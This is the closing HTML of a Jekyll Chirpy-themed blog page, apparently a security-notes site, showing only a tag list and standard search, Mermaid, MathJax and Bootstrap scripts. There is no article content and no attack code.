href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
